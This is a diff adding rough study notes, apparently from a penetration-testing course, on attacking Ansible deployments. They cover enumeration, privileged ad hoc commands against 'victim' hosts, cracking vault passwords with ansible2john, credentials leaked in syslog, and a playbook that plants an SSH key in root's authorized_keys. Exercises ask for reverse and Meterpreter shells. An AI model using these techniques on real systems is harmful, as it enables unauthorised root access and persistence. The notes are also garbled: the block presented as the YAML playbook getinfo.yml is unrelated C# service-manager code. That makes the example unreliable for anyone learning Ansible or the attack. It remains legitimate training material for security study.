@@ -155,3 +155,148 @@ encountered in penetration testing engagements.
 
 We can find the host inventory on the controller at /etc/ansible/hosts.
 
+# enumerating ansible
+
+we can use ansible command to enumerate
+
+`ansible`
+
+/etc/ansible filepath contains the ansible configuration files or the presence of ansible related usernames in etc/passwd
+
+we can also look at syslog file to enumerate ansible
+
+# ad hoc commands
+
+node actions can be initiated from an ansible controller in two primaty ways
+
+adhoc commands and playbooks
+
+ansible victims -a "whoami"
+
+ansible victims -a "whoami" --become
+
+# ansible playbooks
+
+playbooks run with elevated privileges
+
+they use YAML markup language
+
+in  `/opt/playbooks/` we will create `getinfo.yml`
+
+```
+using System;
+using System.Runtime.InteropServices;
+namespace lat
+{
+ class Program
+ {
+ [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, 
+CharSet=CharSet.Unicode, SetLastError=true)]
+ public static extern IntPtr OpenSCManager(string machineName, string databaseName, 
+uint dwAccess);
+ static void Main(string[] args)
+ {
+ String target = "appsrv01";
+ 
+ IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
+ } 
+ }
+}
+```
+
+we run it using ansible-playbook getinfo.yml commmand
+
+# exploiting playbooks for ansible credentials
+
+/opt/playbooks/writefile.yaml.
+
+```
+---
+- name: Write a file as offsec
+ hosts: all
+ gather_facts: true
+ become: yes
+ become_user: offsec
+ vars:
+ ansible_become_pass: lab
+ tasks:
+ - copy:
+ content: "This is my offsec content"
+ dest: "/home/offsec/written_by_ansible.txt"
+ mode: 0644
+ owner: offsec
+ group: offsec
+```
+
+to extract password from the ansible
+
+ python3 /usr/share/john/ansible2john.py ./test.yml
+
+# weak permissions
+
+/opt/playbooks/getinfowritable.yaml h
+
+```
+---
+- name: Get system info
+ hosts: all
+ gather_facts: true
+ become: yes
+ tasks:
+ - name: Display info
+ debug:
+ msg: "The hostname is {{ ansible_hostname }} and the OS is {{ 
+ansible_distribution }}"
+ - name: Create a directory if it does not exist
+ file:
+ path: /root/.ssh
+ state: directory
+ mode: '0700'
+ owner: root
+ group: root
+ - name: Create authorized keys if it does not exist
+ file:
+ path: /root/.ssh/authorized_keys
+ state: touch
+ mode: '0600'
+ owner: root
+ group: root
+ - name: Update keys
+ lineinfile:
+ path: /root/.ssh/authorized_keys
+ line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
+ insertbefore: EOF
+```
+
+# sensitive data leak from ansible
+
+/var/log/syslog
+
+example 
+
+```
+ansibleadm@controller:/opt/playbooks$ cat mysqlbackup.yml
+---
+- name: Backup TPS reports
+ hosts: linuxvictim
+ gather_facts: true
+ become: yes
+ tasks:
+ - name: Run command
+ shell: mysql --user=root --password=hotdog123 --host=databaseserver --databases 
+tpsreports --result-file=/root/reportsbackup
+ async: 10 
+ poll: 0
+```
+cat /var/log/syslong
+
+### 14.2.7.1 Exercises
+1. Execute an ad-hoc command from the controller against the linuxvictim host.
+2. Write a short playbook and run it against the linuxvictim host to get a reverse shell.
+3. Inject a shell command task into the getinfowritable.yml playbook we created earlier and use 
+it to get a Meterpreter shell on the linuxvictim host without first copying the shell to the 
+linuxvictim host via SSH or other protocols
+
+# Artifactory
+
+binary repository manager that stores software packages and other binaries
